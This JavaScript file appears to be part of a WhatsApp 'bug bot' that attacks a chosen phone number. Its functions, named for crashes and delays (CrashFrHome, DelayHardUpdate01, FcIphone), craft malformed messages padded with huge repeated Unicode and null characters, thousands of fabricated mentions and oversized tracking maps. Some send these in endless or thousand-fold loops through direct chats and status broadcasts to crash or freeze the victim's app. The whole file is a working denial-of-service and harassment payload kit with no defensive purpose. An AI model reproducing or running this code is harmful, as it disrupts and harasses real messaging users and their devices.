                            newsletterThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q=="
                        },
                        quotedMessage: {
                            extendedTextMessage: {
                                text: "🎀".repeat(10000),
                                contextInfo: {
                                    forwardingScore: 999999,
                                    isForwarded: true,
                                    stanzaId: "🩸".repeat(10000),
                                    participant: "0@s.whatsapp.net",
                                    remoteJid: "status@broadcast",
                                    deviceListMetadata: {
                                        senderKeyHash: "🩸".repeat(10000),
                                        recipientKeyHash: "🩸".repeat(10000)
                                    }
                                }
                            }
                        },
                        conversionSource: "🩸".repeat(20000),
                        conversionData: Buffer.from("🩸".repeat(1000)),
                        conversionDelaySeconds: 2147483647,
                        externalAdReply: {
                            title: "🩸".repeat(20000),
                            body: "🩸".repeat(20000),
                            mediaType: "IMAGE",
                            thumbnailUrl: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ/0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
                            mediaUrl: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
                            sourceUrl: "t.me/OndetMpx",
                        }
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, Void, {
            messageId: null,
            participant: { jid: target }
        });
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        await sock.relayMessage(target, msg, {
            messageId: null,
            participant: { jid: target }
        });

        console.log("✅ TeamXstrom Sukses send bug");
    } catch (error) {
        console.log("❌ Error:", error.message);
    }
}

async function TeamXstrom(sock, target) {
  while (true) {
    try {   
      const VnfMsg = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: ".../",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_Vnf",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            }
          }
        }
      };

      await sock.relayMessage(target, VnfMsg, { 
        participant: { jid: target } 
      });
      
      console.log(`Delay Hard successfully spammed to ${target}`);

      await new Promise(resolve => setTimeout(resolve, 15000));

    } catch (e) {
      console.log("❌  Error Strike:", e);
      await new Promise(resolve => setTimeout(resolve, 8000));
    }
  }
}

async function blankButton(sock, target) {
await sock.sendMessage(
  target,
  {
    text: "\u0000",
    buttons: [
      {
        buttonId: ".",
        buttonText: { displayText: "Ahh Yamete" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "᬴".repeat(70000),
            sections: [
              {
                title: "\u0000".repeat(5000),
                highlight_label: "label",
                rows: []
              }
            ]
          })
        }
      },
      {
        buttonId: ".",
        buttonText: { displayText: "Ahh" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "᬴".repeat(70000),
            sections: [
              {
                title: "\u0000".repeat(5000),
                highlight_label: "label",
                rows: []
              }
            ]
          })
        }
      },
      {
        buttonId: ".",
        buttonText: { displayText: "Ahh Yamete" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "᬴".repeat(70000),
            sections: [
              {
                title: "\u0000".repeat(5000),
                highlight_label: "label",
                rows: []
              }
            ]
          })
        }
      }
    ],
    headerType: 1
  }, { participant: { jid: target } });
}

async function CrashFrHome(sock, target) {
  try {
    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?...",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_...",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1990 }, () =>
                  "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.sendMessage(target, stickerMsg);
    console.log("succes sending bug");

    for (let i = 0; i < 1000; i++) {
      await sock.sendMessage(target, {
        viewOnceMessage: {
          message: {
            eventMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "33333333333333333@newsletter",
                newsletterName: "FrezeHomeAbouse",
              },
            },
          },
        },
      });

      console.log(`sending to ${target}`);
    }
  } catch (e) {
    console.log("error:", e);
  }
}

async function Delayhard(target = true) {
let RaaImupp = [];

for (let r = 0; r < 1000; r++) {
RaaImupp.push({
body: { text: '' },
header: {
title: '',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '',
}
});
}

let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: '𝐖𝐇𝐎 𝐀𝐑𝐄 𝐘𝐎𝐔?' },
carouselMessage: {
cards: RaaImupp
},
contextInfo: {
remoteJid: Math.random().toString(36) + "Mals",
isForwarded: true,
forwardingScore: 999,
urlTrackingMap: {
urlTrackingMapElements: Array.from({ length: 5000 }, () => ({
"\u0000": "\u0000"
}))
}
}
}
}
}
}, {});

await sock.relayMessage(target, {
groupStatusMessageV2: {
message: msg.message,
},
}, target ?
{ 
messageId: msg.key.id, 
participant: { jid: target },
} : { messageId: msg.key.id }
);
}

async function StcDelay(target) {
  try {

    const raaimupp = "𑇂𑆵𑆴𑆿".repeat(5000)

    const mentions = Array.from({ length: 300 }, () =>
      `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
    )

    const msg = await generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQPXFH5YAO0akaVDM8vbvJ6ltrm_SXYL3WaS5hj6Q_M5wveqds2PAwYMxlbd7r-amjyjYEap_cZAJEp3pHOfLcoqhwwR5u2e87JPy_Po8w?ccb=9-4&oh=01_Q5Aa4AHjeJKBdmKBNo78ImXLoVszfdQGVrMym26QV7bdQnFx1g&oe=69DA5C97&_nc_sid=e6ed6c&mms3=true",

              fileSha256: Buffer.from("holxtc+E/LciJ8adRL4RzyWt0X+MFIdBANqwF/9h590=", "base64"),
              fileEncSha256: Buffer.from("vdPuBybD8JyZuvtlJqpWfK5FPOnDY284DHQws15s1KY=", "base64"),
              mediaKey: Buffer.from("JqgReqpRocYXA0F4njQT6vddj9wJ2kXvetcpvMjZ+6Q=", "base64"),

              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m231/AQPXFH5YAO0akaVDM8vbvJ6ltrm_SXYL3WaS5hj6Q_M5wveqds2PAwYMxlbd7r-amjyjYEap_cZAJEp3pHOfLcoqhwwR5u2e87JPy_Po8w?ccb=9-4&oh=01_Q5Aa4AHjeJKBdmKBNo78ImXLoVszfdQGVrMym26QV7bdQnFx1g&oe=69DA5C97&_nc_sid=e6ed6c",

              fileLength: "18118",

              caption: "STC " + raaimupp,

              contextInfo: {
                mentionedJid: mentions,
                forwardingScore: 1,
                isForwarded: true
              }
            }
          }
        }
      }),
      { userJid: sock.user.id }
    )

    await sock.relayMessage(
      target,
      msg.message,
      { messageId: msg.key.id }
    )

  } catch (err) {
    console.log("Error Jing:", err)
  }
}

async function BlankXDelay(target) {
    const message = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '666@newsletter',
                    newsletterName: " ꦾ".repeat(60000),
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKqojEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                    caption: "ꦾ".repeat(90000),
                    inviteExpiration: Date.now() + 0x99999999999abcdef,
                    contextInfo: {
                        remoteJid: target,
                        participant: target,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            target,
                            ...Array.from({ length: 2000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ],
                        stanzaId: "x",
                        businessMessageForwardInfo: {
                            businessOwnerJid: "13135550002@s.whatsapp.net"
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, message, {
        messageId: null,
        participant: { jid: target }
    });
}

async function Blankuiii(target) {
await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "1887967@g.us",
            inviteCode: "ꦽ".repeat(38000),
            inviteExpiration: "99999999999",
            groupName: "Meta Ai" + "ꦾ".repeat(99700),
            caption: "https://t.me/elyssavirellequeen", 
            body: { 
             text: "ꦾ".repeat(10000), 
          }, 
           newsletterAdminInviteMessage: {
            newsletterJid: "120363370508049655@newsletter",
            newsletterName: "ꦾ".repeat(980000),
            caption: "ꦽ".repeat(590000),
            inviteExpiration: "909092899",
            }
          }
        }
      }
    },
    { 
      messageId: null, 
      participant: { jid: target }, 
    } 
  ); 


   const msg1 = await generateWAMessageFromContent(target, {
   message: {
       stickerMessage: {
               url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
               fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
               fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
               mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
               mimetype: "image/webp",
               height: 9999,
               width: 9999,
               directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
               fileLength: 12260,
               mediaKeyTimestamp: "1743832131",
               isAnimated: false,
               stickerSentTs: "X",
               isAvatar: false,
               isAiSticker: false,
               isLottie: false,
               contextInfo: {
                   mentionedJid: [
                   "0@s.whatsapp.net",
                      ...Array.from(
                      { length: 1900 },
                      () => 
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                       ),
                   ],
                   stanzaId: "1234567890ABCDEF",
                   quotedMessage: {
                       paymentInviteMessage: {
                           serviceType: 3,
                           expiryTimestamp: Date.now() + 1814400000
                       }
                   }
               }
           }
         }
       },
       {
           timestamp: Date.now(),
           userJid: sock.user.id
       });
       
   await sock.relayMessage(target, msg1.message, {
    participant: { jid: target },
    messageId: msg1.key.id,
    quoted: null
  });
}

async function StatusLove(sock, target) {
  const Track = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };

  const Location = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };

  const Mentions = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };

  for (const msg of [Track, Location, Mentions]) {
    await sock.relayMessage(
      "status@broadcast",
      msg,
      {
        messageId: null,
        statusJidList: [target],
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({}))
        },
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
}

async function LiteGetlles(sock, target) {
console.log(chalk.blue(`Delay Invisible : ${target}`));
    await sock.relayMessage("status@broadcast", {
        interactiveResponseMessage: {
            body: {
                text: "NULL NULL NULL",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "FORM_SCREEN",
                version: 3
            },
            contextInfo: {
                remoteJid: Math.random().toString(36) + "CALL_ACCESS",
                isForwarded: true,
                forwardingScore: 999,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from({ length: 280000 }, () => ({
                        "\u0000": "Grettles"
                    }))
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { status_setting: "contacts" },
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function DelayHardUpdate01(target) {
  let raraaMSG;

  function buildMessage() {
    return generateWAMessageFromContent(target, raraa, {});
  }

  async function sendStatus() {
    return sock.relayMessage("status@broadcast", raraaMSG.message, {
      messageId: raraaMSG.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });
  }

  const duration = 60000;
  const raraa2 = Date.now();

  const partA = {
    hasMediaAttachment: false,
    text: "- 𝑻𝒉𝒆𝒚 𝒔𝒂𝒘 𝒂 𝒔𝒎𝒊𝒍𝒆, 𝒃𝒖𝒕 𝒏𝒆𝒗𝒆𝒓 𝒕𝒉𝒆 𝒘𝒂𝒓 𝒃𝒆𝒉𝒊𝒏𝒅 𝒎𝒚 𝒆𝒚𝒆𝒔 - 😈",
    format: "DEFAULT"
  };

  const partB = {
    paramsJson: "\u0000".repeat(1045900),
    version: 3,
    name: "address_message"
  };

  const partC = {
    width: 1920,
    height: 1080,
    mimetype: "video/mp4",
    seconds: 3600,
    fileLength: "1073741824",
    mediaKeyTimestamp: "1775847446",
    mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",
    fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",
    fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",
    directPath: "/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ"
  };

  const partD = {
    forwardingScore: 9999,
    isForwarded: true,
    expiration: 9741,
    ephemeralSettingTimestamp: 9741,
    entryPointConversionApp: "WhatsApp",
    entryPointConversionSource: "WhatsApp.com",
    entryPointConversionDelaySeconds: 9742,
    disappearingMode: {
      initiator: "INITIATED_BY_OTHER",
      trigger: "ACCOUNT_SETTING"
    }
  };

  const partE = {
    remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
    urlTrackingMap: {
      urlTrackingMapElements: Array.from({ length: 5000 }, (_, z) => ({
        participant: `62${z + 720599}@s.whatsapp.net`
      }))
    },
    mentionedJid: [
      "0@s.whatsapp.net",
      ...Array.from({ length: 1900 }, () =>
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ]
  };

  const raraa = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          videoMessage: {
            ...partC,
            contextInfo: { ...partE, ...partD }
          },
          body: partA,
          nativeFlowResponseMessage: partB
        }
      }
    }
  };

  raraaMSG = buildMessage();
  await sendStatus();

  while (true) {

    if (Date.now() - raraa2 >= duration) break;

    const dynamicFlow = {
      version: 3,
      name: "flow_message",
      paramsJson: "\u0000".repeat(10000)
    };

    const dynamicBody = {
      format: "DEFAULT",
      text: "AmpsByMakLoeee"
    };

    const dynamicCtx = {
      forwardingScore: 9999,
      isForwarded: true,
      remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
      mentionedJid: [
        target,
        ...Array.from({ length: 300 }, () => target)
      ],
      urlTrackingMap: {
        urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
          participant: `62${z + 720599}@s.whatsapp.net`
        }))
      }
    };

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: dynamicBody,
            contextInfo: dynamicCtx,
            nativeFlowResponseMessage: dynamicFlow
          }
        }
      }
    }, {
      participant: { jid: target }
    });

  }
}

async function Fcnewwtry(target) {

  const baseMedia = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",
    directPath: "/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ",
    mimetype: "image/webp",
    fileLength: "10610",
    mediaKeyTimestamp: String(Date.now())
  };

  const viewOncePayload = {
    viewOnceMessageV2: {
      message: {
        stickerMessage: {
          ...baseMedia,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          stickerSentTs: Date.now().toString()
        }
      }
    }
  };

  const contextBlock = {
    messageContextInfo: {
      mentionedJid: [target]
    }
  };

  const statusRevoke = {
    groupStatusMentionMessage: {
      message: {
        protocolMessage: {
          key: {
            participant: "131355550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            id: ""
          },
          type: "REVOKE"
        }
      }
    }
  };

  const finalMessage = {
    ...statusRevoke,
    message: {
      ...contextBlock,
      ...viewOncePayload
    }
  };

  await sock.relayMessage(target, finalMessage, {
    participant: { jid: target }
  });
}

async function FcIphone(sock, target) {
  const x = "BEGIN:CARD";
  const r = (s, n) => s.repeat(n);
  await sock.relayMessage("status@broadcast", {
    contactMessage: {
      displayName: x + r("𑇂𑆵𑆴𑆿", 1e4),
      vcard: `BEGIN:VCARD\nVERSION:1.0\nN:;${x}${r("𑇂𑆵𑆴𑆿", 1e4)};;;\nFN:${x}${r("𑇂𑆵𑆴𑆿", 1e4)}\nNICKNAME:${x}${r("ᩫᩫ", 4e3)}\nORG:${x}${r("ᩫᩫ", 4e3)}\nTITLE:${x}${r("ᩫᩫ", 4e3)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:${x}${r("ᩫᩫ", 4e3)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:${x}${r("ᩫᩫ", 4e3)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:${x}${r("ᩫᩫ", 4e3)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;${x}${r("ᩫᩫ", 4e3)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:${x}${r("ᩫᩫ", 4e3)}\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ//Z\nX-WA-BIZ-NAME:${x}${r("ᩫᩫ", 4e3)}\nEND:VCARD`,
      contextInfo: {
        participant: "status@broadcast",
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\0".repeat(1e5),
          greetingMessageBody: "\0"
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "allowlist" },
      content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
    }]
  });
}

bot.launch()
